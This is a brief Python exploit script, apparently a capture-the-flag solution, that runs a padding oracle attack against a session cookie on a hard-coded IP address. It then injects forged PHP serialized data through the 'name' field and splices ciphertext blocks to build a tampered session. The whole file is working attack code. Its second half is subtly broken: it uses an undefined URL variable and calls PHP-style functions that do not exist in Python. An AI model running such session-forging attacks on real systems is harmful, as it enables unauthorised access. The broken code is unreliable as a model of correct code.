import padding_oracle_attack

import requests
import logging
from base64 import b64decode, b64encode
from urllib.parse import unquote, quote

logging.basicConfig(level='DEBUG')

target = 'http://34.82.101.212:8002/'

## padding oracle attack
def oracle(cipher):
    r = requests.get(target, cookies={'session': quote(b64encode(cipher))})
    return 'error' not in r.text

sess = 'nqF9DO6FWtqxjHBziSFYi1k0cvr8jMNuQ3O9Srqj2Roi2kONT4rgiZqgw7IbM%2BPvQMGcDJOehh82jYNzBObHnQ%3D%3D'
cipher = b64decode(unquote(sess))

print(padding_oracle_attack.crack(cipher, 16, 4, oracle))
# Get plaintext:
# b'a:2:{s:4:"show";b:0;s:4:"name";s:1:"a";}\x08\x08\x08\x08\x08\x08\x08\x08'


## inject our malicious serialized data in to name
name = '___________a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}";}\x01'
session = requests.post(URL, data={'name': name}).cookies.get('session')

cipher = base64_decode(urldecode(session))
cipher = cipher[48:112]
session = urlencode(base64_encode(cipher))
print(requests.get(URL, cookies={'session': session}).text)

